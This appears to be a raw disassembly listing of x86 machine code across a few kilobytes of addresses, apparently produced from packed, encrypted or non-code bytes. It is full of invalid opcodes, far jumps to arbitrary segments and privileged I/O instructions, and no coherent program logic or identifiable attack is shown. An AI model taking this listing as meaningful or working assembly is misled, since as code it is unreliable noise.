  410ee8:	inc    edi
  410ee9:	test   bl,cl
  410eeb:	inc    esi
  410eec:	aaa    
  410eed:	pop    ss
  410eee:	stos   DWORD PTR es:[edi],eax
  410eef:	push   0xa78d2162
  410ef4:	mov    ebx,0x80498bc
  410ef9:	add    bh,BYTE PTR [eax+0x11d06361]
  410eff:	pop    ebx
  410f00:	adc    eax,0xaa173a19
  410f05:	jnp    0x410f2c
  410f07:	add    DWORD PTR [esi],edx
  410f09:	test   dl,0x3e
  410f0c:	add    BYTE PTR [ebp+esi*4-0x3c],ch
  410f10:	mov    ebp,0x2aa50b68
  410f15:	clc    
  410f16:	outs   dx,BYTE PTR ds:[esi]
  410f17:	mov    bl,0x9a
  410f19:	out    0x9e,eax
  410f1b:	inc    ebp
  410f1c:	lock jmp 0xb209:0x76492bf0
  410f24:	mov    ecx,0x5cd89367
  410f29:	cmp    DWORD PTR [edi],esi
  410f2b:	dec    esp
  410f2c:	dec    ebx
  410f2d:	xor    BYTE PTR [eax+0x2f4ee3fa],al
  410f33:	cld    
  410f34:	cld    
  410f35:	mov    ecx,0xf53a46cc
  410f3a:	call   FWORD PTR [edi+ebx*1]
  410f3d:	je     0x410f2b
  410f3f:	stos   DWORD PTR es:[edi],eax
  410f40:	(bad)  
  410f41:	lock mov ebx,0xbf36b8f8
  410f47:	sbb    DWORD PTR [esi+0xbb3cad5],esi
  410f4d:	adc    ebp,ebp
  410f4f:	mov    bl,BYTE PTR ds:0xb0d325d3
  410f55:	cmp    dh,dh
  410f57:	cmp    DWORD PTR [ebp-0x63f62a9f],0xffffffa4
  410f5e:	mov    ch,0x12
  410f60:	(bad)  
  410f61:	test   DWORD PTR [ebx+edi*2-0x2b],0x4895a1bc
  410f69:	push   ss
  410f6a:	push   ds
  410f6b:	xor    eax,0xd651a002
  410f70:	sbb    eax,0x17f1250f
  410f75:	sub    eax,0x8979f33f
  410f7a:	add    DWORD PTR [ebp-0x59],edx
  410f7d:	fucomp st(4)
  410f7f:	sub    al,0xdc
  410f81:	xchg   esp,eax
  410f82:	les    esp,FWORD PTR [ebp+0x42a945ba]
  410f88:	jle    0x410f70
  410f8a:	fsubr  st(2),st
  410f8c:	retf   0x87
  410f8f:	xor    eax,0xd5a7da78
  410f94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f95:	retf   0xe022
  410f98:	cli    
  410f99:	js     0x410f80
  410f9b:	mov    edx,0xccc7900f
  410fa0:	push   cs
  410fa1:	and    ah,BYTE PTR [edx-0x5f8720d8]
  410fa7:	in     al,0x82
  410fa9:	push   esi
  410faa:	rcr    BYTE PTR [ecx+ebp*4+0x75],0x76
  410faf:	mov    eax,0x953e2136
  410fb4:	and    eax,DWORD PTR [ecx+0x1c]
  410fb7:	in     eax,0x7a
  410fb9:	inc    edx
  410fba:	xlat   BYTE PTR ds:[ebx]
  410fbb:	mov    edi,0x12e19793
  410fc0:	xchg   ebp,eax
  410fc1:	or     DWORD PTR [edx],edx
  410fc3:	or     ah,al
  410fc5:	(bad)  
  410fc6:	ins    DWORD PTR es:[edi],dx
  410fc7:	and    ch,0xea
  410fca:	fs mov cl,0xbe
  410fcd:	out    0x92,eax
  410fcf:	and    al,dh
  410fd1:	inc    esp
  410fd2:	iret   
  410fd3:	lds    edi,FWORD PTR [esi]
  410fd5:	mov    DWORD PTR [ecx-0x78c2d7f1],edi
  410fdb:	sbb    DWORD PTR [eax+0x338d0da5],ebp
  410fe1:	pop    ebp
  410fe2:	xor    al,0xdc
  410fe4:	cs jecxz 0x410fae
  410fe7:	lods   al,BYTE PTR ds:[esi]
  410fe8:	int    0x6a
  410fea:	mov    ah,0x58
  410fec:	jmp    0xafd1:0x5d83e2d2
  410ff3:	aam    0x59
  410ff5:	push   ebp
  410ff6:	add    cl,0x25
  410ff9:	sbb    al,ah
  410ffb:	add    al,0x4c
  410ffd:	aas    
  410ffe:	fstp   DWORD PTR [ebp+0x3a]
  411001:	scas   eax,DWORD PTR es:[edi]
  411002:	mov    dh,0x32
  411004:	mov    edi,0x527c3058
  411009:	pop    esp
  41100a:	mov    ch,0xc7
  41100c:	dec    eax
  41100d:	push   cs
  41100e:	fnsave [ebx+0xbd40179]
  411014:	ret    
  411015:	jmp    0xb0c67746
  41101a:	sbb    BYTE PTR [ebx+0x34],0xb2
  41101e:	xlat   BYTE PTR ds:[ebx]
  41101f:	add    DWORD PTR [eax-0x31],edx
  411022:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411023:	xor    ch,BYTE PTR [eax+ebx*8+0x25]
  411027:	les    edx,FWORD PTR [esi+ebx*8-0x6af185a5]
  41102e:	jo     0x410fce
  411030:	retf   0x830b
  411033:	xchg   ebp,eax
  411034:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411035:	call   0xcf9c27db
  41103a:	mov    al,ds:0xb47dedd8
  41103f:	dec    ebx
  411040:	mov    ds:0x109d197b,al
  411045:	push   edi
  411046:	push   ds
  411047:	jo     0x410ff9
  411049:	dec    ecx
  41104a:	dec    ebp
  41104b:	xchg   edx,eax
  41104c:	mov    al,ds:0x7b4782ed
  411051:	call   0x7f2e2a73
  411056:	test   BYTE PTR [eax-0x61e764cc],bh
  41105c:	cwde   
  41105d:	ret    
  41105e:	jne    0x411092
  411060:	daa    
  411061:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411062:	xor    al,0x45
  411064:	pop    es
  411065:	bound  ebp,QWORD PTR [ebp-0x12]
  411068:	test   al,0xd5
  41106a:	int    0x4b
  41106c:	mov    eax,0xe3953468
  411071:	rcl    BYTE PTR [edi],1
  411073:	test   BYTE PTR [edx+ebx*1+0x16f8ce35],dl
  41107a:	dec    ecx
  41107b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41107c:	mov    bh,0x69
  41107e:	mov    bl,0x39
  411080:	or     dl,cl
  411082:	fs mov esp,0x4d86ec62
  411088:	jp     0x411069
  41108a:	fcmovnu st,st(0)
  41108c:	add    al,0xb4
  41108e:	cld    
  41108f:	(bad)  
  411090:	cmp    eax,0xe973ebff
  411095:	cmp    DWORD PTR [edi+0x7b12c597],edi
  41109b:	add    eax,0xe69d99d1
  4110a0:	jecxz  0x4110ec
  4110a2:	(bad)  
  4110a3:	pop    eax
  4110a4:	outs   dx,DWORD PTR ds:[esi]
  4110a5:	dec    ecx
  4110a6:	xlat   BYTE PTR ds:[ebx]
  4110a7:	test   BYTE PTR [edi+0x56],0x43
  4110ab:	clc    
  4110ac:	push   0xffffffbb
  4110ae:	stos   DWORD PTR es:[edi],eax
  4110af:	dec    ecx
  4110b0:	fst    DWORD PTR [edx-0x359eea25]
  4110b6:	adc    DWORD PTR [eax+0x19606d90],edi
  4110bc:	jle    0x41103f
  4110be:	adc    eax,0x3cf1d353
  4110c3:	push   ss
  4110c4:	jmp    0x7dd4:0xf96d29fe
  4110cb:	jnp    0x411120
  4110cd:	add    BYTE PTR [edx-0x44],dl
  4110d0:	xor    DWORD PTR [ebp-0x5b49e250],ebx
  4110d6:	adc    al,0x80
  4110d8:	jnp    0x41109b
  4110da:	inc    edx
  4110db:	jb     0x41107e
  4110dd:	mov    esi,0x76395a69
  4110e2:	stos   BYTE PTR es:[edi],al
  4110e3:	(bad)  
  4110e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110e5:	test   al,0x86
  4110e7:	adc    eax,0x6c9529e4
  4110ec:	jns    0x411097
  4110ee:	jge    0x4110f0
  4110f0:	jmp    0x411142
  4110f2:	mov    cl,0xab
  4110f4:	jge    0x411095
  4110f6:	pop    ds
  4110f7:	fs pop ss
  4110f9:	pop    esp
  4110fa:	rcl    ah,0xb5
  4110fd:	jecxz  0x411136
  4110ff:	arpl   WORD PTR [eax],cx
  411101:	push   ds
  411102:	xor    bl,cl
  411104:	aas    
  411105:	mov    edx,0xbe9f1191
  41110a:	mov    WORD PTR [ecx+ebp*8-0x2f1ed58b],ss
  411111:	xchg   edx,eax
  411112:	mov    BYTE PTR [eax],bl
  411114:	aam    0x30
  411116:	cld    
  411117:	pusha  
  411118:	dec    ecx
  411119:	and    al,0xe3
  41111b:	cmp    esp,DWORD PTR [ebx]
  41111d:	fld    QWORD PTR [esi-0xf]
  411120:	xchg   edx,eax
  411121:	leave  
  411122:	xor    eax,0xedbb32c4
  411127:	jle    0x411137
  411129:	xchg   ebp,eax
  41112a:	xchg   ebp,eax
  41112b:	mov    al,0xa6
  41112d:	cs scas al,BYTE PTR es:[edi]
  41112f:	ins    BYTE PTR es:[edi],dx
  411130:	jp     0x4110d1
  411132:	das    
  411133:	jnp    0x41113a
  411135:	mov    esi,DWORD PTR [edx]
  411137:	nop
  411138:	fisttp QWORD PTR [edi+0x506508aa]
  41113e:	jecxz  0x411149
  411140:	outs   dx,BYTE PTR ds:[esi]
  411141:	mov    ds:0x1f7f13b7,al
  411146:	fbstp  TBYTE PTR [edi]
  411148:	dec    edx
  411149:	pop    edx
  41114a:	xor    bh,ah
  41114c:	cmp    eax,0xf8a9a89f
  411151:	xor    edx,DWORD PTR [ebp+edx*4+0x6bc5194f]
  411158:	mov    esi,0xfc8d625e
  41115d:	cdq    
  41115e:	dec    edi
  41115f:	or     al,0xe
  411161:	jge    0x411146
  411163:	adc    edx,0x7d
  411166:	mov    ?,ebx
  411168:	xchg   BYTE PTR [eax],bh
  41116a:	(bad)  
  41116b:	cmc    
  41116c:	jmp    0xcfc2:0x445970c2
  411173:	lahf   
  411174:	pop    edx
  411175:	and    dl,ah
  411177:	(bad)  [edi+0x19ca8042]
  41117d:	imul   ecx,esp,0x90befa5c
  411183:	sahf   
  411184:	call   0x6940:0x823a5652
  41118b:	test   dh,bh
  41118d:	cmp    ecx,edx
  41118f:	pop    eax
  411190:	xchg   DWORD PTR [edi+0x49],ebx
  411193:	xchg   BYTE PTR [esp+ebx*8+0x6b],al
  411197:	(bad)  
  411198:	cmp    ecx,DWORD PTR [ecx-0x1a]
  41119b:	jmp    0x4111a8
  41119d:	repz lahf 
  41119f:	mov    bh,0xf1
  4111a1:	push   ecx
  4111a2:	mov    WORD PTR [edi+0x5c],gs
  4111a5:	mov    eax,ds:0x96ab4f95
  4111aa:	push   ebx
  4111ab:	fdivr  DWORD PTR ds:0xba73b3c6
  4111b1:	arpl   WORD PTR [edx-0x7e],dx
  4111b4:	xor    BYTE PTR [eax],bl
  4111b6:	inc    eax
  4111b7:	shl    esi,0x57
  4111ba:	pop    es
  4111bb:	mov    al,ds:0xe0c3094c
  4111c0:	xchg   esi,eax
  4111c1:	pushf  
  4111c2:	loope  0x4111c5
  4111c4:	pusha  
  4111c5:	fisubr WORD PTR [ebx+0x2e]
  4111c8:	jle    0x411163
  4111ca:	bnd jg 0x41118b
  4111cd:	sub    ebx,ebx
  4111cf:	jno    0x4111ab
  4111d1:	lahf   
  4111d2:	pop    ecx
  4111d3:	xlat   BYTE PTR ds:[ebx]
  4111d4:	mov    BYTE PTR [eax],bh
  4111d6:	sbb    eax,DWORD PTR [edi+0x572ed01d]
  4111dc:	jo     0x411220
  4111de:	inc    eax
  4111df:	fdivp  st(1),st
  4111e1:	push   es
  4111e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111e3:	sbb    al,0x55
  4111e5:	cwde   
  4111e6:	pop    edi
  4111e7:	(bad)  
  4111e8:	lods   al,BYTE PTR ds:[esi]
  4111e9:	push   ebx
  4111ea:	out    0xef,eax
  4111ec:	div    DWORD PTR [edi-0x13af4994]
  4111f2:	imul   edx,DWORD PTR [edi+0x71],0xe
  4111f6:	frstor [esp+eax*4+0x3b74fd02]
  4111fd:	xchg   ebx,eax
  4111fe:	lahf   
  4111ff:	mov    dh,0xa8
  411201:	dec    ecx
  411202:	call   0xf3ba:0xa2c24631
  411209:	adc    edx,0x6c
  41120c:	push   ecx
  41120d:	add    BYTE PTR [eax-0x7614cea8],cl
  411213:	jg     0x4111d0
  411215:	jmp    0x2e84a1e5
  41121a:	ins    BYTE PTR es:[edi],dx
  41121b:	in     eax,dx
  41121c:	and    al,0x31
  41121e:	stc    
  41121f:	or     eax,DWORD PTR [ebp-0x53]
  411222:	xlat   BYTE PTR ds:[ebx]
  411223:	jne    0x411291
  411225:	sub    bl,dh
  411227:	mov    cl,0x5c
  411229:	or     BYTE PTR [edi+0x18ad471a],ch
  41122f:	iret   
  411230:	sub    eax,0x6a2aeebb
  411235:	mov    ds:0x8c86450,al
  41123a:	dec    ebx
  41123b:	test   al,0x55
  41123d:	dec    ecx
  41123e:	in     al,0x44
  411240:	xor    BYTE PTR [edi],al
  411242:	jg     0x41128a
  411244:	movaps xmm7,XMMWORD PTR [ebx]
  411247:	dec    edi
  411248:	cmp    al,0x5e
  41124a:	dec    ebp
  41124b:	mov    fs,edx
  41124d:	hlt    
  41124e:	mov    eax,0xdeff085b
  411253:	xlat   BYTE PTR ds:[ebx]
  411254:	int    0xa1
  411256:	(bad)  
  411257:	ins    BYTE PTR es:[edi],dx
  411258:	stos   BYTE PTR es:[edi],al
  411259:	push   esp
  41125a:	ret    
  41125b:	adc    eax,0xaa8d6d16
  411260:	outs   dx,DWORD PTR ds:[esi]
  411261:	icebp  
  411262:	outs   dx,BYTE PTR ds:[esi]
  411263:	rcr    BYTE PTR [edx-0x379d73e1],0x88
  41126a:	and    BYTE PTR [edx-0x5eae016f],ch
  411270:	mov    dh,0x41
  411272:	repz mov ebp,0x280f783b
  411278:	inc    edi
  411279:	inc    esp
  41127a:	sbb    DWORD PTR [eax-0x19f3f7b4],eax
  411280:	jecxz  0x4112df
  411282:	stos   DWORD PTR es:[edi],eax
  411283:	stc    
  411284:	clc    
  411285:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411286:	xchg   BYTE PTR [esi-0x6218836d],ch
  41128c:	mov    dh,0xc5
  41128e:	sbb    ebp,esi
  411290:	and    DWORD PTR [edx-0x7c],ecx
  411293:	outs   dx,BYTE PTR ds:[esi]
  411294:	pop    ebx
  411295:	jmp    0x6de8783
  41129a:	pop    edi
  41129b:	or     eax,0x299da63b
  4112a0:	mov    ds:0x4dbdd7c5,al
  4112a5:	les    edx,FWORD PTR [edi+0x23f443da]
  4112ab:	cdq    
  4112ac:	xchg   esi,eax
  4112ad:	push   esp
  4112ae:	mov    edi,0x5804227b
  4112b3:	pop    ss
  4112b4:	jno    0x4112dc
  4112b6:	lea    ebp,[ecx+esi*4-0x66]
  4112ba:	jp     0x4112c7
  4112bc:	jmp    0x1df4c073
  4112c1:	pusha  
  4112c2:	mov    ds:0x3f6bfa2b,eax
  4112c7:	push   es
  4112c8:	pop    edi
  4112c9:	mov    BYTE PTR es:[esi-0x7b4f30f],cl
  4112d0:	sbb    dh,BYTE PTR [edi]
  4112d2:	ins    DWORD PTR es:[edi],dx
  4112d3:	cmp    DWORD PTR [esi],0xfd7d491e
  4112d9:	pop    esi
  4112da:	cmp    al,0xe8
  4112dc:	jle    0x411285
  4112de:	dec    esp
  4112df:	std    
  4112e0:	leave  
  4112e1:	cmc    
  4112e2:	pop    ebx
  4112e3:	mov    dl,0x2c
  4112e5:	inc    ebx
  4112e6:	dec    ebx
  4112e7:	fidivr DWORD PTR [esi-0x13]
  4112ea:	mov    ebx,DWORD PTR [edx+eax*4-0x3]
  4112ee:	adc    al,0x58
  4112f0:	into   
  4112f1:	push   ecx
  4112f2:	xchg   eax,ebp
  4112f4:	mov    ch,0xad
  4112f6:	cmp    eax,0x9d33cc48
  4112fb:	cmp    al,0xc8
  4112fd:	mov    BYTE PTR [edx-0x20541f5],bl
  411303:	sub    dh,BYTE PTR [ebp+0x38]
  411306:	push   0xfab3a817
  41130b:	inc    ebx
  41130c:	inc    edi
  41130d:	adc    esi,DWORD PTR [esi]
  41130f:	xchg   esp,eax
  411310:	xchg   ch,dl
  411312:	out    0x9b,al
  411314:	or     DWORD PTR [ebp-0x3d],edx
  411317:	mov    bl,0xf
  411319:	(bad)  
  41131b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41131c:	in     al,0xeb
  41131e:	sub    DWORD PTR [esi-0xd83a387],0x11
  411325:	gs enter 0xc,0x2
  41132a:	test   esp,ecx
  41132c:	test   edx,ebx
  41132e:	sub    al,0x3e
  411330:	push   0x4a
  411332:	in     al,dx
  411333:	inc    edx
  411334:	xchg   esi,eax
  411335:	ror    DWORD PTR [ecx-0x4bb262ed],1
  41133b:	add    al,0xce
  41133d:	or     DWORD PTR [edi],eax
  41133f:	push   0xdcdf3b
  411344:	dec    esi
  411345:	rol    bh,0xc2
  411348:	dec    edi
  411349:	stos   DWORD PTR es:[edi],eax
  41134a:	mov    ds:0x487550a9,eax
  41134f:	adc    edi,esp
  411351:	mov    al,ds:0x25472906
  411356:	cmp    al,0xa5
  411358:	mov    esp,0xbaa41f99
  41135d:	adc    al,0x8a
  41135f:	push   eax
  411360:	shr    ecx,0x72
  411363:	add    ecx,DWORD PTR [ecx-0x7c]
  411366:	outs   dx,BYTE PTR ds:[esi]
  411367:	fstp   TBYTE PTR [ebp+0x4b046c06]
  41136d:	gs jg  0x411345
  411370:	cmp    bl,al
  411372:	sub    al,dh
  411374:	out    dx,eax
  411375:	retf   0x93c
  411378:	add    dl,BYTE PTR [ecx+0x4e]
  41137b:	sti    
  41137c:	outs   dx,DWORD PTR ds:[esi]
  41137d:	dec    ecx
  41137e:	xchg   esi,eax
  41137f:	iret   
  411380:	mov    dl,0x95
  411382:	in     al,0x38
  411384:	ins    DWORD PTR es:[edi],dx
  411385:	add    BYTE PTR ds:0xdf1619b6,al
  41138b:	fs jns 0x41135c
  41138e:	xchg   BYTE PTR [eax],dh
  411390:	out    0xe0,eax
  411392:	(bad)  
  411393:	adc    edx,esi
  411395:	fwait
  411396:	(bad)  
  411397:	mov    dh,0xac
  411399:	pop    es
  41139a:	dec    esp
  41139b:	rcr    DWORD PTR [ebp+0x63],0x2f
  41139f:	not    BYTE PTR [esi+0x209816a4]
  4113a5:	outs   dx,DWORD PTR ds:[esi]
  4113a6:	bound  ebp,QWORD PTR [ebx+0x6af34fa2]
  4113ac:	imul   ecx,DWORD PTR [esi],0xffffff8a
  4113af:	xchg   ebx,eax
  4113b0:	shl    bl,1
  4113b2:	outs   dx,BYTE PTR ds:[esi]
  4113b3:	clc    
  4113b4:	mov    edi,0x65ee174a
  4113b9:	jns    0x411364
  4113bb:	fadd   QWORD PTR [esi+0xb5764b3]
  4113c1:	inc    ecx
  4113c2:	add    BYTE PTR [eax+ecx*4],0x42
  4113c6:	sub    al,0x46
  4113c8:	xor    ecx,edx
  4113ca:	mov    ebx,0x8b16a3bc
  4113cf:	loopne 0x41138f
  4113d1:	jge    0x4113f8
  4113d3:	and    ch,ah
  4113d5:	retf   0x1410
  4113d8:	aam    0xb0
  4113da:	lahf   
  4113db:	aaa    
  4113dc:	mov    bh,0x93
  4113de:	in     al,dx
  4113df:	das    
  4113e0:	pop    esp
  4113e1:	jno    0x411406
  4113e3:	into   
  4113e4:	not    BYTE PTR [ebp+0xe673653]
  4113ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113eb:	loop   0x4113f4
  4113ed:	loope  0x4113ea
  4113ef:	pop    esi
  4113f0:	test   al,0x2e
  4113f2:	push   ebx
  4113f3:	fwait
  4113f4:	repz adc BYTE PTR [eax+0x33a03b57],dh
  4113fb:	jo     0x41141b
  4113fd:	ins    DWORD PTR es:[edi],dx
  4113fe:	fisttp QWORD PTR [edi+0x57]
  411401:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411402:	arpl   WORD PTR [ecx+0x25923992],bp
  411408:	pop    edi
  411409:	aam    0x9b
  41140b:	and    bl,BYTE PTR [eax+0x78d1d55e]
  411411:	(bad)  
  411412:	jmp    0xa21:0x883ecb69
  411419:	cs mov ah,0xe1
  41141c:	repnz sub bh,BYTE PTR [esi+0x73]
  411420:	leave  
  411421:	adc    DWORD PTR [eax+esi*4],ecx
  411424:	(bad)  
  411425:	or     eax,0xe754f967
  41142a:	fcomp  DWORD PTR [ebx+0x4245c9fc]
  411430:	ror    BYTE PTR [ecx-0x6e],cl
  411433:	and    ebx,DWORD PTR [edi-0x12]
  411436:	push   edx
  411437:	fsubr  DWORD PTR [eax-0x77]
  41143a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41143b:	xor    eax,0x9a9ae72b
  411440:	mov    edx,0x4857df04
  411445:	fbld   TBYTE PTR [eax-0x5c17a03f]
  41144b:	xchg   edx,eax
  41144c:	lahf   
  41144d:	addr16 aam 0x3a
  411450:	sub    DWORD PTR [eax+0x33],0x19
  411454:	jmp    0xc8ef:0x44ad11d3
  41145b:	inc    ecx
  41145c:	hlt    
  41145d:	loop   0x411456
  41145f:	jge    0x411434
  411461:	test   DWORD PTR [eax],0x15bdfe47
  411467:	inc    ebp
  411468:	pop    ebp
  411469:	inc    ecx
  41146a:	in     eax,dx
  41146b:	stos   BYTE PTR es:[edi],al
  41146c:	jb     0x41140b
  41146e:	sti    
  41146f:	sbb    DWORD PTR [eax+0x2c],esi
  411472:	cld    
  411473:	lea    esi,[ebx-0x4a]
  411476:	sub    eax,0xad8b31ac
  41147b:	inc    esi
  41147c:	in     eax,0xe3
  41147e:	test   DWORD PTR [esi],esi
  411480:	cld    
  411481:	aas    
  411482:	xchg   esp,eax
  411483:	xlat   BYTE PTR ds:[ebx]
  411484:	xchg   DWORD PTR [ebp-0xe],edx
  411487:	inc    BYTE PTR ds:0x6ab2907f
  41148d:	stc    
  41148e:	jl     0x411498
  411490:	mov    ds:0x7fd61ce,eax
  411495:	lahf   
  411496:	dec    edx
  411497:	mov    edx,0xacc30f6c
  41149c:	loopne 0x41148e
  41149e:	mov    edi,0x799c9712
  4114a3:	data16 aaa 
  4114a5:	sub    ch,BYTE PTR [edx+ebp*8+0x352b033]
  4114ac:	lock cld 
  4114ae:	sub    eax,0xc6ff86b8
  4114b3:	std    
  4114b4:	jmp    0xde8d2fad
  4114b9:	and    ebp,DWORD PTR [ebp+0x59]
  4114bc:	addr16 jns 0x411506
  4114bf:	add    ebp,DWORD PTR [edx]
  4114c1:	mov    BYTE PTR [esi],0x69
  4114c4:	leave  
  4114c5:	hlt    
  4114c6:	(bad)  
  4114c7:	jbe    0x4114dc
  4114c9:	add    BYTE PTR [edi+0x2cff7598],ch
  4114cf:	jmp    0x4114b2
  4114d1:	mov    bl,BYTE PTR ds:0x4fb0de7
  4114d7:	cmp    esi,DWORD PTR [edi+0x5bf1e2dd]
  4114dd:	test   eax,0x49d98818
  4114e2:	nop
  4114e3:	pop    ds
  4114e4:	sub    al,0xba
  4114e6:	ret    0x91ba
  4114e9:	gs jl  0x41154a
  4114ec:	pop    es
  4114ed:	in     al,0x5d
  4114ef:	and    dh,BYTE PTR [ebx+0x3d1ec787]
  4114f5:	jge    0x411492
  4114f7:	scas   eax,DWORD PTR es:[edi]
  4114f8:	scas   eax,DWORD PTR es:[edi]
  4114f9:	xchg   edi,eax
  4114fa:	or     BYTE PTR [edx+eiz*4+0x7f347dae],bl
  411501:	aad    0x42
  411503:	jb     0x4114b8
  411505:	sahf   
  411506:	loop   0x411567
  411508:	mov    ds:0x31500882,eax
  41150d:	sub    esi,DWORD PTR [edi-0x3]
  411510:	dec    eax
  411511:	sub    eax,0xd20879c4
  411516:	xor    bl,BYTE PTR [esi+0x3f25bde7]
  41151c:	jmp    0x41157a
  41151e:	jle    0x4114ec
  411520:	je     0x41159d
  411522:	push   ebx
  411523:	out    0x2a,al
  411525:	or     BYTE PTR [ecx+edx*1],dh
  411528:	mov    ds:0x375545dc,eax
  41152d:	mov    edx,DWORD PTR [eax+0x30]
  411530:	outs   dx,DWORD PTR ds:[esi]
  411531:	jne    0x411576
  411533:	sbb    edi,DWORD PTR [ecx-0x47]
  411536:	retf   
  411537:	ror    DWORD PTR [esi-0x44],cl
  41153a:	es push 0xffffffb1
  41153d:	push   ds
  41153e:	mov    ecx,0x79266d8e
  411543:	xor    eax,0x59e5fe53
  411548:	jb     0x411564
  41154a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41154b:	push   es
  41154c:	xchg   BYTE PTR [ecx-0x7a],dh
  41154f:	in     al,0x15
  411551:	inc    esp
  411552:	in     al,dx
  411553:	ins    DWORD PTR es:[edi],dx
  411554:	dec    DWORD PTR [ebp+ecx*1+0x55]
  411558:	icebp  
  411559:	cwde   
  41155a:	test   al,0x17
  41155c:	sbb    bh,bh
  41155e:	push   0x8aff244d
  411563:	loopne 0x41154c
  411565:	repz das 
  411567:	shr    cl,1
  411569:	mov    ds,WORD PTR [esp+eax*8-0x2f0526ef]
  411570:	call   0xa17f:0x5d4edaf2
  411577:	add    dh,BYTE PTR [ebx]
  411579:	cld    
  41157a:	dec    ebx
  41157b:	xlat   BYTE PTR ds:[ebx]
  41157c:	xchg   BYTE PTR ds:0x6ad96aa4,dl
  411582:	retf   0xcca0
  411585:	ret    
  411586:	outs   dx,DWORD PTR ds:[esi]
  411587:	lods   eax,DWORD PTR ds:[esi]
  411588:	mov    ah,0x66
  41158a:	sub    BYTE PTR [edx],dl
  41158c:	cmp    ecx,0xffffffc8
  41158f:	cmp    dl,BYTE PTR [ecx+0x6f]
  411592:	inc    edx
  411593:	enter  0xbf1a,0x6
  411597:	or     eax,0xa127edac
  41159c:	jle    0x411617
  41159e:	or     DWORD PTR ds:0x29d957b2,esp
  4115a4:	xor    eax,0x993d7890
  4115a9:	fmul   QWORD PTR [edx+0x79a7e21f]
  4115af:	jno    0x4115d1
  4115b1:	sub    al,0xaf
  4115b3:	mov    ah,0x4b
  4115b5:	jnp    0x411620
  4115b7:	pushf  
  4115b8:	dec    eax
  4115b9:	in     al,0x21
  4115bb:	dec    edx
  4115bc:	mov    cl,0xa6
  4115be:	push   0x6b7d4c5a
  4115c3:	jp     0x411557
  4115c5:	add    ebx,DWORD PTR [ecx]
  4115c7:	das    
  4115c8:	jmp    0x411560
  4115ca:	retf   
  4115cb:	std    
  4115cc:	mov    eax,ds:0xd64613d7
  4115d1:	imul   ebp,DWORD PTR [edx+edi*8-0x5c],0x99f0e30c
  4115d9:	ins    BYTE PTR es:[edi],dx
  4115da:	fdivr  st,st(4)
  4115dc:	test   DWORD PTR [ecx-0x544d4eb4],esp
  4115e2:	sti    
  4115e3:	push   esi
  4115e4:	sub    bl,BYTE PTR ds:0x358982c2
  4115ea:	adc    dl,BYTE PTR [edi+0x33]
  4115ed:	push   ds
  4115ee:	ret    0x185f
  4115f1:	add    BYTE PTR [edx],bh
  4115f3:	mov    eax,0xcdec2743
  4115f8:	add    esi,DWORD PTR [ebx-0x3c]
  4115fb:	sar    DWORD PTR [eax+0x318f6942],cl
  411601:	mov    ebp,0x4248c191
  411606:	leave  
  411607:	pop    eax
  411608:	daa    
  411609:	add    BYTE PTR [ebx-0x207941c2],cl
  41160f:	or     eax,0x4ec1eed9
  411614:	dec    ebp
  411615:	daa    
  411616:	int    0x7a
  411618:	jb     0x41160c
  41161a:	shr    al,1
  41161c:	mov    bl,0x8f
  41161e:	mov    ds:0x66a12cb7,eax
  411623:	bound  ecx,QWORD PTR [ebp+0x7d]
  411626:	or     DWORD PTR [edx+0x22],0xc29f62cd
  41162d:	inc    esp
  41162e:	repz fdivrp st(1),st
  411631:	mov    es,WORD PTR [edi+0x16]
  411634:	adc    edx,DWORD PTR [eax+ebx*4]
  411637:	fild   WORD PTR [esi+0x74]
  41163a:	call   0xbae0:0x6b7eca24
  411641:	cmp    ch,bl
  411643:	ret    
  411644:	and    bh,ah
  411646:	hlt    
  411647:	lahf   
  411648:	js     0x411647
  41164a:	call   0x8b78:0xd5ff8358
  411651:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411652:	icebp  
  411653:	pop    edi
  411654:	dec    ebx
  411655:	sub    al,0x57
  411657:	and    bl,al
  411659:	dec    edx
  41165a:	xor    al,0x3a
  41165c:	xor    DWORD PTR [edx+0x73],edx
  41165f:	retf   
  411660:	xor    DWORD PTR [ebp+0x20eb67a1],ecx
  411666:	(bad)  
  411667:	loopne 0x4116c9
  411669:	pop    ds
  41166a:	jns    0x4116de
  41166c:	mov    dh,0xa5
  41166e:	clc    
  41166f:	dec    DWORD PTR [eax+0x17]
  411672:	call   0xf5f542f3
  411677:	adc    BYTE PTR [ebp+0x9],dh
  41167a:	add    BYTE PTR [eax+ecx*4+0x2],dh
  41167e:	pop    edx
  41167f:	pop    esi
  411680:	sar    BYTE PTR [ebx],1
  411682:	cld    
  411683:	mov    ss,WORD PTR [ecx]
  411685:	adc    eax,0x2c11ab1d
  41168a:	jle    0xd3015243
  411690:	mov    dl,0xa2
  411692:	xchg   esi,eax
  411693:	jb     0x411678
  411695:	rol    BYTE PTR [ecx+0x7b],cl
  411698:	imul   ebp,DWORD PTR [edi+0x4a],0x7c
  41169c:	daa    
  41169d:	pop    es
  41169e:	fdiv   DWORD PTR [ebx+0x1b]
  4116a1:	push   ecx
  4116a2:	mov    cs,ebx
  4116a4:	or     BYTE PTR [eax],al
  4116a6:	push   esp
  4116a7:	hlt    
  4116a8:	out    dx,eax
  4116a9:	sbb    esp,DWORD PTR [eax-0x17]
  4116ac:	or     cl,dl
  4116ae:	pop    ss
  4116af:	clc    
  4116b0:	mov    ebp,0x7f9e4806
  4116b5:	push   0xffffff8f
  4116b7:	fild   WORD PTR [ebx+ecx*4-0x59]
  4116bb:	add    eax,0xff77cbff
  4116c0:	mov    ch,0x14
  4116c2:	sbb    DWORD PTR [edi],edi
  4116c4:	in     eax,dx
  4116c5:	push   esp
  4116c6:	mov    ecx,0xeaa7035e
  4116cb:	lods   eax,DWORD PTR ds:[esi]
  4116cc:	inc    esp
  4116cd:	jl     0x411724
